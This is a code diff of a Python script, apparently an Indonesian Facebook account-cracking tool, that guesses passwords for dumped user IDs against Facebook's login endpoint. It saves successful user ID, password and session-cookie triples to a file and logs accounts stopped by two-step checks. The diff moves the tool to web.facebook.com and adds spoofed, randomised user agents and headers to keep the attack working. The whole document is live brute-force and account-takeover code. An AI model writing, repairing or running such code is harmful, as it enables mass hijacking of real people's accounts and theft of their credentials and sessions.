@@ -4,7 +4,7 @@
 import os
 import re
 import sys
-import  json
+import json
 import requests
 import time
 import uuid
@@ -88,7 +88,7 @@ class Zoraa_Dev:
                     self.userid, self.username = UserID_And_Username.split('|')
                     self.password = self.WordList(self.username)
                     V.submit(self.Exec_WbLock, self.userid, self.password)
-            print('\n\n[•] Hasil Ok: {}\n[•] Hasil Cp: {}\n\n[•] Dump ID: {}'.format(self.success,self.checkpoint,str(len(dump))))
+            exit('\n\n[•] Hasil Ok: {}\n[•] Hasil Cp: {}\n\n[•] Dump ID: {}'.format(self.success,self.checkpoint,str(len(dump))))
         except (KeyboardInterrupt, Exception) as e:
             exit(f'[!] Error: {str(e).title()}')
             
@@ -96,10 +96,9 @@ class Zoraa_Dev:
         with requests.Session() as byps:
             for passwd in password:
                 try:
-                    self.chrome = random.randint(128,139)
-                    self.useragents = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Mobile Safari/537.36".format(self.chrome)
+                    self.chrome = random.randint(111,139)
+                    self.useragents = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Mobile Safari/537.36".format(self.chrome)
                     self.get_headers = {
-                        "host": "m.facebook.com",
                         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                         "user-agent": "Mozilla/5.0 (Linux; Android 7.1.1; KirinX Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36",
                         "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
@@ -107,7 +106,7 @@ class Zoraa_Dev:
                         "accept-language": "id-ID,id;q=0.9",
                         "priority": "u=1, i"
                      }
-                    response = byps.get('https://m.facebook.com/login.php', headers=self.get_headers, allow_redirects=True).text
+                    response = byps.get('https://web.facebook.com/login/?_rdr', headers=self.get_headers, allow_redirects=True).text
                     payload = {
                         "__aaid": '0',
                         "__user": "0",
@@ -192,10 +191,10 @@ class Zoraa_Dev:
                          }),
                      }
                     self.post_headers = {
-                        "host": "m.facebook.com",
+                        "host": "web.facebook.com",
                         "content-length": "4319",
                         "sec-ch-ua-full-version-list": "\"Not;A=Brand\";v=\"99.0.0.0\", \"Google Chrome\";v=\"139.0.7258.62\", \"Chromium\";v=\"139.0.7258.62\"",
-                        "sec-ch-ua-platform": "\"Android\"",
+                        "sec-ch-ua-platform": "\"Linux\"",
                         "sec-ch-ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
                         "sec-ch-ua-model": "",
                         "sec-ch-ua-mobile": "?1",
@@ -204,39 +203,41 @@ class Zoraa_Dev:
                         "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                         "sec-ch-ua-platform-version": "",
                         "accept": "*/*",
-                        "origin": "https://m.facebook.com",
-                        "sec-fetch-site": "none",
+                        "origin": "https://web.facebook.com",
+                        "sec-fetch-site": "same-origin",
                         "sec-fetch-mode": "navigate",
                         "sec-fetch-dest": "document",
-                        "referer": "https://m.facebook.com/login/",
+                        "referer": "https://web.facebook.com/login/?_rdr",
                         "accept-encoding": "gzip, deflate",
                         "accept-language": "id-ID,id;q=0.9",
                         "x-fb-lsd": re.search('"lsd":"(.*?)"',str(response)).group(1),
                         "cookies": "fr=1BjN72JrkUHC03BgX.AWcvum8whY7ywMHph-2c60eLb_Vwj-1VuWcsUn08fPA23ABH_Uw.BonAS6..AAA.0.0.BonATc.AWdE--N48VhGZab8tu4Vp7wxorY",
                         "priority": "u=1, i"
                     }
-                    response2 = byps.post('https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=7dc3df7a1c2b41c2ef275eac1130af6da64453b8e5de853b8cf45b43c64d127b',data = payload, headers = self.post_headers)
+                    response2 = byps.post('https://web.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=7dc3df7a1c2b41c2ef275eac1130af6da64453b8e5de853b8cf45b43c64d127b',data = payload, headers = self.post_headers, allow_redirects=False)
                     if 'c_user' in byps.cookies.get_dict().keys():
                         self.success+=1
                         cookies = (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])
-                        Console().print('''Success:{{
+                        print('''Success:{{
   User ID: {}
   Password: {}
+  Useragents: {}
   Cookies: {}
-}}'''.format(userid, passwd, cookies))
+}}'''.format(userid, passwd, cookies, self.post_headers.get("user-agent")))
                         open(self.ok,'a').write('{}|{}|{}\n'.format(userid,passwd,cookies))
                         break             
-                    if 'com.bloks.www.two_step_verification.async.entrypoint' in str(response2.text.replace('\\', '')):
-                        Console().print('''Checkpoint:{{
+                    if 'two_step_verification' in str(response2.text.replace('\\', '')):
+                        print('''Checkpoint:{{
   User ID: {}
   Password: {}
-}}'''.format(userid, passwd))
+  Useragents: {}
+}}'''.format(userid, passwd, self.post_headers.get("user-agent")))
                         self.checkpoint+=1
                         open(self.cp,'a').write('{}|{}\n'.format(userid,passwd))
                         break    
                     else: continue   
                 except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects) as e:
-                    Console().print('[•] Koneksi Error', end='\r')
+                    print('[•] Koneksi Error', end='\r')
                     time.sleep(31)
                     self.Exec_WbLock(userid, password)
             self.loop +=1  
